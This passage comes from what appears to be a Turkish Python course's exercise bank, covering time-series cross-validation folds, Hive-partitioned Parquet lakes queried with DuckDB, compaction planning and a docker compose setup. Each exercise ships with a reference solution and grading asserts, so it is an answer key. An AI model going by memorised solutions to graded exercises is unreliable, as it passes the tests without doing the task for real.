        q: '<p>İleri yürüyen doğrulamayı kendin yaz: <code>katlar(n, n_splits, test_size)</code>, scikit-learn\'ün <code>TimeSeriesSplit(n_splits, test_size=test_size)</code> davranışını taklit etsin. <code>n</code> satır sayısıdır. Son kat serinin sonunda biter; katlar birbirini izler, her katın test bloğu <code>test_size</code> uzunluğundadır ve eğitim, test bloğunun başına kadar olan tüm satırlardır (genişleyen pencere). Her katı <code>(egitim_bas, egitim_son, test_bas, test_son)</code> demeti olarak döndür; <code>son</code> değerleri hariçtir (Python dilimi gibi). Eğitim boş kalacaksa <code>ValueError</code> fırlat.</p>',
        start: 'def katlar(n, n_splits, test_size):\n    return []\n',
        sol: 'def katlar(n, n_splits, test_size):\n    ilk_test = n - n_splits * test_size\n    if ilk_test <= 0:\n        raise ValueError("eğitim kümesi boş kalıyor")\n    sonuc = []\n    for i in range(n_splits):\n        tb = ilk_test + i * test_size\n        sonuc.append((0, tb, tb, tb + test_size))\n    return sonuc\n',
        tests: 'from sklearn.model_selection import TimeSeriesSplit\nimport numpy as np\nfor n, k, t in [(85, 3, 7), (20, 4, 3), (10, 2, 4)]:\n    beklenen = [(int(a[0]), int(a[-1]) + 1, int(b[0]), int(b[-1]) + 1) for a, b in TimeSeriesSplit(n_splits=k, test_size=t).split(np.zeros(n))]\n    assert katlar(n, k, t) == beklenen, f"n={n}, k={k}, t={t}: sklearn {beklenen}, gelen {katlar(n, k, t)}"\ntry:\n    katlar(10, 5, 2)\n    assert False, "10 satırda 5x2 test bloğu eğitime yer bırakmaz: ValueError"\nexcept ValueError:\n    pass\n',
        hints: ['Test blokları sondan geriye dizilir: ilk test bloğu n - n_splits * test_size\'da başlar.', 'i. katın test başı: ilk_test + i * test_size; eğitim 0\'dan test başına kadar.', 'ilk_test <= 0 ise eğitim boştur.'],
        why: 'Genişleyen pencereli ileri yürüyen doğrulama, modelin her tahminde yalnız geçmişi gördüğü gerçek kullanımı taklit eder. Hata katlar boyunca artıyorsa veri dağılımı kayıyordur (drift); bu da zaman serisi tahmini dersinde yeniden eğitim sıklığını belirleyecek.'
      }
    ],
    faq: [
      {
        q: 'Gecikme özellikleri mi, ARIMA gibi klasik modeller mi?',
        a: 'Tek bir seri ve az veri varsa ExponentialSmoothing/ARIMA güçlü ve yorumlanabilirdir. Çok sayıda seri (her istasyon, her ürün), dış değişkenler (hava, kampanya) ve doğrusal olmayan ilişkiler varsa gecikme özellikleri + gradyan artırma genellikle daha iyi sonuç verir. Her iki durumda da önce naive kıyasla başla.'
      }
    ],
    mistakes: [
      {
        why: 'Pencere o günü içerirse model cevabı görerek öğrenir; testte mükemmel, canlıda başarısız olur. Pencereyi her zaman shift ettikten sonra uygula.',
        bad: 'X["ort_7"] = s.rolling(7).mean()',
        good: 'X["ort_7"] = s.shift(1).rolling(7).mean()'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'polars-duckdb' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'polars-duckdb',
    min: 30,
    html: `<p>Tek bir büyük Parquet dosyası bir noktadan sonra yetmez: her sorgu bütün dosyayı tarar, yeni gün eklemek için dosyayı baştan yazman gerekir. Veri gölleri (data lake) bu yüzden veriyi <b>bölümlere</b> (partition) ayrılmış klasörlerde tutar. Bu bölümde Pedal İzmir'in 116 bin yolculuğunu ay ay bölümlenmiş bir Parquet gölüne yazacak, DuckDB ile sorgulayacak, bölüm budamayı (partition pruning) ölçecek ve küçük dosya sorununu tanıyacaksın. pyarrow, DuckDB ve polars hem yerelde hem tarayıcıda çalışır.</p>
<h2>Hive bölümleme: klasör adı = sütun değeri</h2>
<p>Hive düzeninde (Hive-style partitioning) bölüm sütunu klasör adına <code>sutun=deger</code> biçiminde yazılır ve dosyanın içinden çıkarılır:</p>
<pre class="out">gol/
├── ay=2024-06/data_0.parquet
├── ay=2024-07/data_0.parquet
└── ay=2024-08/data_0.parquet</pre>
<p>Okuyucu (DuckDB, polars, Spark, Athena, BigQuery) klasör adlarından <code>ay</code> sütununu geri kurar. Asıl kazanç şudur: <code>WHERE ay = '2024-07'</code> filtresi geldiğinde motor diğer klasörlere hiç girmez. Buna <b>bölüm budama</b> denir ve dosya içindeki satır grubu istatistiklerine dayalı atlamadan (predicate pushdown) da önce gelir.</p>
<pre class="py">import veri, duckdb, pathlib, shutil
yol = veri.yol("pedal_izmir", "bk_trips")
shutil.rmtree("gol", ignore_errors=True)
duckdb.sql(f"""
    COPY (SELECT *, strftime(started_at::TIMESTAMP, '%Y-%m') AS ay FROM read_csv_auto('{yol}'))
    TO 'gol' (FORMAT parquet, PARTITION_BY (ay))
""")
print(sorted(str(p) for p in pathlib.Path("gol").rglob("*.parquet")))
print(duckdb.sql("""
    SELECT ay, COUNT(*) AS yolculuk, ROUND(SUM(fare), 2) AS ciro
    FROM read_parquet('gol/**/*.parquet', hive_partitioning = true)
    GROUP BY ay ORDER BY ay
""").fetchall())</pre>
<p>Aynı gölü başka araçlarla da yazabilirsin; üçü de aynı klasör yapısını üretir ve birbirinin yazdığını okur:</p>
<pre class="code">import pyarrow.parquet as pq
pq.write_to_dataset(tablo, root_path="gol", partition_cols=["ay"])      # pyarrow

df.write_parquet("gol", partition_by="ay")                              # polars (yeni sürümler)
pl.scan_parquet("gol/**/*.parquet", hive_partitioning=True).filter(pl.col("ay") == "2024-07")</pre>
<h2>Budamayı ölçmek</h2>
<p>Budamanın gerçekten çalıştığını tahmin etme, ölç. DuckDB'de <code>EXPLAIN ANALYZE</code> taranan dosya sayısını gösterir (çıktının biçimi sürüme göre değişir):</p>
<pre class="code">EXPLAIN ANALYZE
SELECT COUNT(*) FROM read_parquet('gol/**/*.parquet', hive_partitioning = true)
WHERE ay = '2024-07';</pre>
<pre class="out">│ File Filters: ay = '2024-07'    │
│ Scanning Files: 1/3             │
│ Total Files Read: 1             │</pre>
<p>Budamayı bozan üç klasik hata var. Bir: filtreyi bölüm sütununa değil türetilmiş bir ifadeye yazmak (<code>WHERE strftime(started_at, '%Y-%m') = '2024-07'</code> tüm dosyaları açar; <code>WHERE ay = '2024-07'</code> açmaz). İki: tür uyuşmazlığı; <code>yil=2024</code> klasörü sayıya, <code>ay=07</code> metne çevrilebilir, karşılaştırmayı aynı türle yap. Üç: filtreyi bir alt sorgunun sonucuna bağlamak; değer sorgu planlanırken bilinmediği için budama yapılamayabilir.</p>
<h2>Bölüm sütunu nasıl seçilir? Küçük dosya sorunu</h2>
<div class="tbl-wrap"><table><tr><th>Seçim</th><th>Sonuç</th></tr>
<tr><td>Sorgularda hep filtrelenen, düşük kardinaliteli sütun (gün, ay, ülke)</td><td>İyi: az klasör, büyük dosyalar, güçlü budama</td></tr>
<tr><td>Yüksek kardinaliteli sütun (<code>user_id</code>, <code>trip_id</code>)</td><td>Kötü: binlerce klasör, her birinde birkaç KB'lık dosya</td></tr>
<tr><td>Çok seviye (<code>gun/istasyon/saat</code>)</td><td>Kötü: bölüm sayısı çarpılarak büyür</td></tr></table></div>
<p>Küçük dosya sorunu (small files problem) şudur: her dosyanın açılması, üst verisinin (footer) okunması ve bulut depolamada ayrı bir istek gerektirmesi sabit bir maliyettir. 6.000 kullanıcıya bölünmüş bir göl, 3 aylık bir gölden yüzlerce kat yavaş sorgulanabilir. Kaba kural: dosya başına 100 MB ile 1 GB arası hedefle; günlük artımlı yazımlar küçük dosyalar üretiyorsa düzenli olarak <b>sıkıştır</b> (compaction): bir bölümdeki küçük dosyaları okuyup birkaç büyük dosya olarak yeniden yaz. Delta Lake ve Apache Iceberg gibi tablo biçimleri bunu (<code>OPTIMIZE</code>) ve atomik yazmayı hazır sunar.</p>
<div class="warn"><b>Bölümleme her derde deva değil</b>116 bin satırlık bir tabloyu bölümlemek ölçülebilir bir kazanç getirmez; tek Parquet dosyası zaten saniyenin altında okunur. Bölümleme gigabaytlar ve sürekli eklenen veri için düşünülür.</div>
<div class="note"><b>Gerçek işte</b>Veri mühendisliği mülakatlarında "S3'teki olay verisini nasıl düzenlersin?" sorusu çok sık gelir. Beklenen cevap: Parquet, tarihe göre Hive bölümleme, dosya boyutu hedefi, sıkıştırma işi ve sorgu motorunun budamayı kullandığını EXPLAIN ile doğrulamak.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'polars-duckdb-y1',
        stage: 'Isınma',
        q: 'Olay verisi <code>gun=YYYY-MM-DD</code> klasörlerine bölümlenmiş. <code>WHERE gun = \'2024-07-15\'</code> sorgusu hızlıdır ama <code>WHERE CAST(olay_zamani AS DATE) = \'2024-07-15\'</code> yavaştır. Neden?',
        o: [
          'İkinci sorgu tarihleri metin olarak karşılaştırdığı için her satırda ayrı dönüşüm yapar',
          'Budama yalnız bölüm sütunundaki filtrede çalışır; ikincisi tüm klasörleri açar',
          'CAST işlemi Parquet\'te desteklenmediği için DuckDB veriyi önce CSV\'ye çevirir',
          'İkinci sorgu satır grubu istatistiklerini kapatır ve yavaş bir dizin taraması kullanır'
        ],
        a: 1,
        why: 'Motor hangi klasörlere girmeyeceğine sorguyu planlarken, klasör adlarındaki değerlere bakarak karar verir. Filtre bölüm sütununda değilse bu karar verilemez ve her dosya açılır. Satır grubu istatistikleri biraz yardımcı olsa da dosyaların açılma maliyeti kalır.'
      },
      {
        t: 'mc',
        id: 'polars-duckdb-y2',
        stage: 'Isınma',
        q: 'Pedal İzmir yolculukları için bölüm sütunu seçiyorsun; sorgular çoğunlukla tarih aralığına göre. Hangisi en iyi seçim?',
        o: ['<code>user_id</code> (6.000 farklı değer)', '<code>trip_id</code> (her satır farklı)', '<code>ay</code> ya da büyük veride <code>gun</code>', '<code>distance_km</code> (ondalıklı sayı)'],
        a: 2,
        why: 'Bölüm sütunu sık filtrelenen ve düşük kardinaliteli olmalıdır. user_id ve trip_id binlerce klasör ve küçük dosya üretir; ondalıklı bir ölçüm sütunu ise anlamsız sayıda bölüm yaratır.'
      },
      {
        t: 'predict',
        id: 'polars-duckdb-y3',
        stage: 'Kodu oku',
        q: 'Hive yolundan bölüm değerlerini çıkaran bu kod ne yazdırır?',
        o: [
          '{\'yil\': \'2024\', \'ay\': \'07\', \'sehir\': \'İzmir\'} str',
          '{\'yil\': 2024, \'ay\': 7, \'sehir\': \'İzmir\'} int',
          '{\'yil\': \'2024\', \'ay\': \'07\', \'sehir\': \'İzmir\'} int',
          '{\'gol\': None, \'yil\': \'2024\', \'ay\': \'07\', \'sehir\': \'İzmir\'} str'
        ],
        a: 0,
        code: 'yol = "gol/yil=2024/ay=07/sehir=İzmir/data_0.parquet"\nbolumler = dict(p.split("=", 1) for p in yol.split("/") if "=" in p)\nprint(bolumler, type(bolumler["ay"]).__name__)\n',
        why: 'Klasör adı her zaman metindir; "07" bile. Okuyucu motorlar tür çıkarımı yapabilir (DuckDB yil\'i sayıya çevirebilir), bu yüzden filtre değerini bölüm sütununun gerçek türüyle yazmak önemlidir. "gol" ve dosya adı = içermediği için atlanır.'
      },
      {
        t: 'order',
        id: 'polars-duckdb-y4',
        stage: 'Kodu oku',
        q: '<p>pyarrow ile satış kanalına göre bölümlü küçük bir göl yazıp DuckDB ile yalnız web bölümünü sayan programın satırlarını sırala. Beklenen çıktı:</p><pre class="out">[\'kanal=mobil\', \'kanal=web\'] 2</pre>',
        lines: [
          'import pyarrow as pa, pyarrow.parquet as pq, duckdb, pathlib, shutil',
          'tablo = pa.table({"kanal": ["web", "mobil", "web"], "tutar": [120, 80, 45]})',
          'shutil.rmtree("mini_gol", ignore_errors=True)',
          'pq.write_to_dataset(tablo, root_path="mini_gol", partition_cols=["kanal"])',
          'klasorler = sorted(p.name for p in pathlib.Path("mini_gol").iterdir())',
          'n = duckdb.execute("SELECT COUNT(*) FROM read_parquet(\'mini_gol/**/*.parquet\', hive_partitioning = true) WHERE kanal = \'web\'").fetchone()[0]',
          'print(klasorler, n)'
        ],
        expect: '[\'kanal=mobil\', \'kanal=web\'] 2\n',
        hint: 'Tablo yazılmadan klasörler listelenemez; eski klasör silinmeden yazılırsa önceki çalıştırmanın dosyaları eklenir.',
        why: 'write_to_dataset her bölüme ayrı dosya yazar ve mevcut klasöre ekleme yapar; bu yüzden önce temizlik gerekir. DuckDB hive_partitioning ile kanal sütununu klasör adından geri kurar ve filtrede yalnız web klasörünü okur. Not: bazı pyarrow sürümleri Türkçe karakterli bölüm değerlerini klasör adında yüzde kodlamasıyla yazar (İzmir → %C4%B0zmir); bölüm değerlerinde ASCII tercih et.'
      },
      {
        t: 'code',
        id: 'polars-duckdb-y5',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>Bölüm budamayı kendin yap: <code>budanmis(yollar, filtre)</code>, Hive yollarının listesinden yalnız <code>filtre</code> sözlüğündeki <b>tüm</b> koşullara uyan dosyaları döndürsün. Filtre değeri tek bir metin ya da metin kümesi (<code>set</code>, "IN" anlamında) olabilir. Filtrede olan ama yolda bulunmayan bölüm sütunu, o dosyanın elenmesine yol açmaz (motor emin olamadığı için okur). Orijinal sırayı koru.</p>',
        guide: [
          'Her yol için bölüm sözlüğünü çıkar: "=" içeren parçaları split("=", 1) ile ayır.',
          'Filtredeki her (sütun, değer) için: sütun yolda yoksa geç; varsa değer eşleşmeli.',
          'Değer set ise "in", değilse "==" ile karşılaştır.',
          'Tüm koşullar sağlanan yolları listeye ekle.'
        ],
        example: 'kosul = {"07", "08"}\nfor deger in ["06", "07"]:\n    print(deger, deger in kosul if isinstance(kosul, set) else deger == kosul)\n',
        start: 'def budanmis(yollar, filtre):\n    sonuc = []\n    for yol in yollar:\n        bolum = {}\n        # TODO: bölüm sözlüğünü kur\n        uyar = True\n        # TODO: filtre koşullarını denetle\n        if uyar:\n            sonuc.append(yol)\n    return sonuc\n',
        sol: 'def budanmis(yollar, filtre):\n    sonuc = []\n    for yol in yollar:\n        bolum = dict(p.split("=", 1) for p in yol.split("/") if "=" in p)\n        uyar = True\n        for sutun, deger in filtre.items():\n            if sutun not in bolum:\n                continue\n            v = bolum[sutun]\n            if (v not in deger) if isinstance(deger, set) else (v != deger):\n                uyar = False\n                break\n        if uyar:\n            sonuc.append(yol)\n    return sonuc\n',
        tests: 'Y = ["gol/yil=2024/ay=06/a.parquet", "gol/yil=2024/ay=07/a.parquet", "gol/yil=2024/ay=07/b.parquet",\n     "gol/yil=2024/ay=08/a.parquet", "gol/yil=2025/ay=01/a.parquet"]\nassert budanmis(Y, {"ay": "07"}) == Y[1:3], "Yalnız ay=07 klasöründeki iki dosya"\nassert budanmis(Y, {"yil": "2024", "ay": {"07", "08"}}) == Y[1:4], "IN filtresi ve iki koşul"\nassert budanmis(Y, {"sehir": "İzmir"}) == Y, "Yolda olmayan sütun budama yapamaz; hepsi okunur"\nassert budanmis(Y, {"yil": "2023"}) == [], "Hiçbiri uymaz"\nassert budanmis(Y, {}) == Y, "Filtre yoksa her şey okunur"\n',
        hints: ['Önce bölüm sözlüğü: dict(p.split("=", 1) for p in yol.split("/") if "=" in p).', 'Koşul başarısızsa uyar = False yapıp iç döngüden çık.', 'Değerler metindir: "07" ile 7 eşit değildir.'],
        why: 'Motorların yaptığı budama tam olarak budur: dosyaları açmadan, yalnız yol metnine bakarak eleme. Bu işlem dosya sayısıyla doğrusal ve çok ucuzdur; bu yüzden binlerce dosyalı göllerde bile anında yapılır.'
      },
      {
        t: 'code',
        id: 'polars-duckdb-y6',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Lezzet Kurye siparişlerinden bir göl kur ve sorgula. İki fonksiyon yaz:</p><ul><li><code>gol_kur(kok)</code>: <code>veri.yol("lezzet_kurye", "lk_orders")</code> CSV\'sini DuckDB ile oku, <code>ay</code> (<code>placed_at</code>\'in <code>YYYY-MM</code> hâli) ve <code>status</code> sütunlarına göre (bu sırayla) Hive bölümlü Parquet olarak <code>kok</code> klasörüne yaz. Klasör varsa önce sil. Ay klasörlerinin adlarını sıralı liste döndür.</li><li><code>ay_ozeti(kok, ay)</code>: gölü <code>hive_partitioning</code> ile okuyup verilen ayın durum → sipariş sayısı sözlüğünü döndür. Ay değerini SQL\'e parametreyle ver.</li></ul>',
        start: 'import veri, duckdb, shutil, pathlib\n\ndef gol_kur(kok):\n    pass\n\ndef ay_ozeti(kok, ay):\n    pass\n',
        sol: 'import veri, duckdb, shutil, pathlib\n\ndef gol_kur(kok):\n    shutil.rmtree(kok, ignore_errors=True)\n    yol = veri.yol("lezzet_kurye", "lk_orders")\n    duckdb.sql(f"""\n        COPY (SELECT *, substr(CAST(placed_at AS VARCHAR), 1, 7) AS ay FROM read_csv_auto(\'{yol}\'))\n        TO \'{kok}\' (FORMAT parquet, PARTITION_BY (ay, status))\n    """)\n    return sorted(p.name for p in pathlib.Path(kok).iterdir() if p.is_dir())\n\ndef ay_ozeti(kok, ay):\n    satirlar = duckdb.execute(\n        f"SELECT status, COUNT(*) FROM read_parquet(\'{kok}/**/*.parquet\', hive_partitioning = true) "\n        "WHERE ay = ? GROUP BY status", [ay]).fetchall()\n    return dict(satirlar)\n',
        tests: 'aylar = gol_kur("kurye_gol")\nassert aylar == ["ay=2024-10", "ay=2024-11", "ay=2024-12", "ay=2025-01"], f"Dört ay klasörü beklenir: {aylar}"\nalt = sorted(p.name for p in pathlib.Path("kurye_gol/ay=2024-10").iterdir())\nassert alt == ["status=iade", "status=iptal", "status=teslim"], f"Ayın içinde durum klasörleri olmalı: {alt}"\nassert ay_ozeti("kurye_gol", "2024-10") == {"teslim": 1931, "iptal": 109, "iade": 47}, "Ekim 2024 durum sayıları"\nassert ay_ozeti("kurye_gol", "2025-01") == {"teslim": 1, "iptal": 2}, "Ocak 2025\'te yalnız 3 sipariş var"\nassert gol_kur("kurye_gol") == aylar, "İkinci kurulum aynı sonucu vermeli (önce silinmeli)"\nassert ay_ozeti("kurye_gol", "2024-10")["teslim"] == 1931, "Yeniden kurulumda veri ikilenmemeli"\n',
        hints: [
          'DuckDB: COPY (SELECT ..., ifade AS ay FROM read_csv_auto(...)) TO kok (FORMAT parquet, PARTITION_BY (ay, status)).',
          'Okurken read_parquet(kok/**/*.parquet, hive_partitioning = true); ** alt klasörlerin hepsini kapsar.',
          'duckdb.execute(sorgu, [ay]) ile ? parametresini bağla; dict(fetchall()) sözlüğe çevirir.'
        ],
        why: 'İki seviyeli bölümleme (ay/durum) "Ekim\'in iptalleri" gibi sorgularda tek klasöre iner. Yeniden kurulumda klasörü silmek idempotentliği sağlar; silmezsen DuckDB hata verir ya da başka araçlar dosyaları ekleyerek veriyi ikiler.'
      },
      {
        t: 'code',
        id: 'polars-duckdb-y7',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Sıkıştırma (compaction) planı: <code>sikistirma_plani(dosyalar, hedef_mb)</code> yaz. <code>dosyalar</code>, <code>(bolum, boyut_mb)</code> demetlerinin listesidir. Her bölüm için dosyaları <b>verildikleri sırayla</b> gruplara topla: bir dosyayı eklemek grubun toplamını <code>hedef_mb</code>\'nin üstüne çıkaracaksa yeni grup başlat. Zaten <code>hedef_mb</code>\'den büyük ya da eşit dosyalar tek başına kalır ve plana girmez. Yalnız <b>birden çok dosya içeren</b> grupları, bölüm adına göre sıralı sözlük olarak döndür: <code>{bolum: [[boyutlar], ...]}</code>; hiç grubu kalmayan bölümü sözlüğe koyma.</p>',
        start: 'def sikistirma_plani(dosyalar, hedef_mb):\n    return {}\n',
        sol: 'def sikistirma_plani(dosyalar, hedef_mb):\n    bolumler = {}\n    for bolum, boyut in dosyalar:\n        bolumler.setdefault(bolum, []).append(boyut)\n    plan = {}\n    for bolum in sorted(bolumler):\n        gruplar, grup, toplam = [], [], 0\n        for b in bolumler[bolum]:\n            if b >= hedef_mb:\n                continue\n            if grup and toplam + b > hedef_mb:\n                gruplar.append(grup)\n                grup, toplam = [], 0\n            grup.append(b)\n            toplam += b\n        if grup:\n            gruplar.append(grup)\n        gruplar = [g for g in gruplar if len(g) > 1]\n        if gruplar:\n            plan[bolum] = gruplar\n    return plan\n',
        tests: 'D = [("gun=01", 30), ("gun=01", 40), ("gun=01", 50), ("gun=01", 10), ("gun=02", 300), ("gun=02", 5),\n     ("gun=03", 60), ("gun=03", 70), ("gun=03", 20)]\np = sikistirma_plani(D, 128)\nassert p["gun=01"] == [[30, 40, 50]], f"gun=01: 30+40+50=120, 10 eklenirse 130 > 128; tek kalan 10 plana girmez: {p.get(\'gun=01\')}"\nassert "gun=02" not in p, "300 MB zaten büyük; 5 MB tek başına kalır: gun=02 planda olmamalı"\nassert p["gun=03"] == [[70, 20]], f"gun=03: 60 tek kalır, 70+20 birleşir: {p.get(\'gun=03\')}"\nassert list(p) == ["gun=01", "gun=03"], "Bölümler sıralı olmalı"\nassert sikistirma_plani([], 128) == {}, "Boş liste"\n',
        hints: ['Önce dosyaları bölüme göre grupla (setdefault).', 'Her bölümde sırayla yürü; toplam + b > hedef ise mevcut grubu kapat.', 'Sonda tek elemanlı grupları at: birleştirilecek bir şey yok.'],
        why: 'Delta Lake OPTIMIZE ve Iceberg rewrite_data_files bu tür bir plan çıkarır: küçük dosyaları hedef boyuta yakın gruplar hâlinde birleştirir. Tek dosyalık grubu yeniden yazmak hiçbir şey kazandırmaz, yalnız maliyettir.'
      },
      {
        t: 'code',
        id: 'polars-duckdb-y8',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>aylik_ciro(kok, ay)</code> Hive bölümlü gölde verilen ayın toplam tutarını döndürmeli. Sorgu ya hata veriyor ya da 0 döndürüyor: filtre değeri SQL\'e tırnaksız gömülmüş, <code>2024-07</code> bir çıkarma işlemi olarak (2017) yorumlanıyor. Değeri parametre olarak bağla.</p>',
        start: 'import duckdb, pyarrow as pa, pyarrow.parquet as pq, shutil\n\ndef aylik_ciro(kok, ay):\n    sorgu = f"SELECT COALESCE(SUM(tutar), 0) FROM read_parquet(\'{kok}/**/*.parquet\', hive_partitioning = true) WHERE ay = {ay}"\n    return duckdb.execute(sorgu).fetchone()[0]\n',
        sol: 'import duckdb, pyarrow as pa, pyarrow.parquet as pq, shutil\n\ndef aylik_ciro(kok, ay):\n    sorgu = f"SELECT COALESCE(SUM(tutar), 0) FROM read_parquet(\'{kok}/**/*.parquet\', hive_partitioning = true) WHERE ay = ?"\n    return duckdb.execute(sorgu, [ay]).fetchone()[0]\n',
        tests: 'shutil.rmtree("ciro_gol", ignore_errors=True)\nt = pa.table({"ay": ["2024-06", "2024-07", "2024-07", "2024-08"], "tutar": [100, 250, 50, 75]})\npq.write_to_dataset(t, root_path="ciro_gol", partition_cols=["ay"])\nassert aylik_ciro("ciro_gol", "2024-07") == 300, "Temmuz cirosu 250 + 50 = 300"\nassert aylik_ciro("ciro_gol", "2024-08") == 75, "Ağustos 75"\nassert aylik_ciro("ciro_gol", "2023-01") == 0, "Olmayan ay 0"\n',
        hints: ['f-string\'e gömülen 2024-07 SQL\'de sayısal bir ifadedir.', 'Değeri ? ile parametre olarak ver: duckdb.execute(sorgu, [ay]).', 'Parametre bağlama hem tür sorununu hem SQL enjeksiyonunu çözer.'],
        why: 'Değeri metne gömmek bu tür sessiz tür hatalarına ve enjeksiyona açıktır. Parametreyle verilen değer motor tarafından doğru türde karşılaştırılır ve bölüm budaması da çalışmaya devam eder.'
      },
      {
        t: 'code',
        id: 'polars-duckdb-y9',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Küçük dosya raporu: <code>dosya_raporu(kok, esik_kb)</code> yaz. <code>kok</code> altındaki tüm <code>.parquet</code> dosyalarını bul; her dosyanın bölümünü, kök ile dosya arasındaki klasör yolu olarak (<code>"gun=01/sehir=İzmir"</code> gibi, ayırıcı <code>/</code>) al. Döndür:</p><ul><li><code>"bolum"</code>: farklı bölüm sayısı</li><li><code>"dosya"</code>: dosya sayısı</li><li><code>"ort_kb"</code>: ortalama dosya boyutu (KB = 1024 bayt), 1 ondalık</li><li><code>"kucuk_oran"</code>: boyutu <code>esik_kb</code>\'den küçük dosyaların oranı, 2 ondalık</li><li><code>"en_parcali"</code>: en çok dosya içeren bölüm (eşitlikte alfabetik ilk)</li></ul><p>Hiç dosya yoksa <code>{"bolum": 0, "dosya": 0, "ort_kb": 0.0, "kucuk_oran": 0.0, "en_parcali": None}</code>.</p>',
        start: 'from pathlib import Path\n\ndef dosya_raporu(kok, esik_kb):\n    pass\n',
        sol: 'from pathlib import Path\nfrom collections import Counter\n\ndef dosya_raporu(kok, esik_kb):\n    kok = Path(kok)\n    dosyalar = sorted(kok.rglob("*.parquet"))\n    if not dosyalar:\n        return {"bolum": 0, "dosya": 0, "ort_kb": 0.0, "kucuk_oran": 0.0, "en_parcali": None}\n    bolum_say = Counter("/".join(d.parent.relative_to(kok).parts) for d in dosyalar)\n    boyutlar = [d.stat().st_size / 1024 for d in dosyalar]\n    en = sorted(bolum_say.items(), key=lambda kv: (-kv[1], kv[0]))[0][0]\n    return {"bolum": len(bolum_say), "dosya": len(dosyalar),\n            "ort_kb": round(sum(boyutlar) / len(boyutlar), 1),\n            "kucuk_oran": round(sum(b < esik_kb for b in boyutlar) / len(boyutlar), 2),\n            "en_parcali": en}\n',
        tests: 'import shutil\nshutil.rmtree("rapor_gol", ignore_errors=True)\ndef yaz(yol, kb):\n    p = Path("rapor_gol") / yol\n    p.parent.mkdir(parents=True, exist_ok=True)\n    p.write_bytes(b"x" * int(kb * 1024))\nyaz("gun=01/sehir=İzmir/a.parquet", 2); yaz("gun=01/sehir=İzmir/b.parquet", 3); yaz("gun=01/sehir=İzmir/c.parquet", 1)\nyaz("gun=01/sehir=Ankara/a.parquet", 500); yaz("gun=02/sehir=Ankara/a.parquet", 4); yaz("gun=02/sehir=Ankara/b.parquet", 10)\n(Path("rapor_gol") / "_SUCCESS").write_text("")\nr = dosya_raporu("rapor_gol", 64)\nassert r["bolum"] == 3 and r["dosya"] == 6, f"3 bölüm, 6 parquet dosyası (_SUCCESS sayılmaz): {r}"\nassert r["ort_kb"] == 86.7, f"(2+3+1+500+4+10)/6 = 86.7 KB: {r[\'ort_kb\']}"\nassert r["kucuk_oran"] == 0.83, f"6 dosyanın 5\'i 64 KB\'tan küçük: {r[\'kucuk_oran\']}"\nassert r["en_parcali"] == "gun=01/sehir=İzmir", f"En parçalı bölüm: {r[\'en_parcali\']}"\nassert dosya_raporu("yok_boyle_klasor", 64)["en_parcali"] is None, "Dosya yoksa boş rapor"\n',
        hints: [
          'Path(kok).rglob("*.parquet") alt klasörlerdeki tüm dosyaları verir.',
          'Bölüm: d.parent.relative_to(kok).parts parçalarını "/" ile birleştir (Windows\'ta da aynı sonuç).',
          'Eşitlikte alfabetik ilk için sorted(..., key=lambda kv: (-kv[1], kv[0])).'
        ],
        why: 'Bu rapor bir göl sağlık kontrolüdür: ortalama dosya boyutu düşük ve küçük dosya oranı yüksekse sorgular yavaşlar ve bulut istek maliyeti artar. Sıkıştırma işini bu metriklere göre tetiklemek yaygın bir uygulamadır.'
      }
    ],
    faq: [
      {
        q: 'Hive bölümleme ile Delta Lake / Iceberg arasındaki fark ne?',
        a: 'Hive bölümleme yalnız bir klasör adlandırma kuralıdır; hangi dosyaların tabloya ait olduğunu klasörü listeleyerek bulursun ve yarım yazılan dosyalar okunabilir. Delta Lake ve Iceberg bunun üzerine bir işlem günlüğü (transaction log) ekler: atomik yazma, zaman yolculuğu, şema evrimi, gizli bölümleme ve OPTIMIZE gibi bakım komutları. Dosyalar yine Parquet\'tir.'
      }
    ],
    mistakes: [
      {
        why: 'Tek yıldız yalnız kök klasördeki dosyaları eşler; bölüm klasörlerinin içindekiler okunmaz. ** tüm alt klasörleri kapsar; hive_partitioning ise bölüm sütununu klasör adından geri kurar.',
        bad: 'duckdb.sql("SELECT * FROM read_parquet(\'gol/*.parquet\')")',
        good: 'duckdb.sql("SELECT * FROM read_parquet(\'gol/**/*.parquet\', hive_partitioning = true)")'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'proje-api' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'proje-api',
    min: 35,
    html: `<p>Projenin çekirdeği hazır: şemalar, depo, servis, uç noktalar, testler ve tek konteynerlik bir Dockerfile. Gerçek bir backend portföy projesinde işverenin görmek istediği bir sonraki katman şudur: kalıcı bir veritabanı ve onun migration'ları, sık okunan veriler için önbellek, isteği bekletmeyen arka plan işleri ve kötüye kullanımı sınırlayan hız sınırı. Bu bölüm dört parçayı tek bir <code>docker compose</code> dosyasında birleştiriyor.</p>
<h2>Hedef mimari</h2>
<div class="tbl-wrap"><table><tr><th>Servis</th><th>Görev</th><th>Derste nerede gördün?</th></tr>
<tr><td><code>api</code></td><td>FastAPI + uvicorn; istekleri karşılar</td><td>fastapi, bu proje</td></tr>
<tr><td><code>db</code></td><td>PostgreSQL 16; kalıcı veri (adlandırılmış birim)</td><td>postgresql-python</td></tr>
<tr><td><code>migrate</code></td><td>Tek seferlik: <code>alembic upgrade head</code>, sonra çıkar</td><td>sqlalchemy-orm (Derinleş)</td></tr>
<tr><td><code>redis</code></td><td>Ürün kataloğu önbelleği, hız sınırı sayaçları, iş kuyruğu</td><td>redis-kuyruk</td></tr>
<tr><td><code>worker</code></td><td>Kuyruktan iş alır: sipariş onay e-postası</td><td>redis-kuyruk</td></tr></table></div>
<pre class="code"># compose.yaml
services:
  db:
    image: postgres:16
    environment: {POSTGRES_USER: market, POSTGRES_PASSWORD: $\{DB_SIFRE}, POSTGRES_DB: market}
    volumes: [pgdata:/var/lib/postgresql/data]
    healthcheck: {test: ["CMD-SHELL", "pg_isready -U market"], interval: 5s, retries: 10}
  redis:
    image: redis:7-alpine
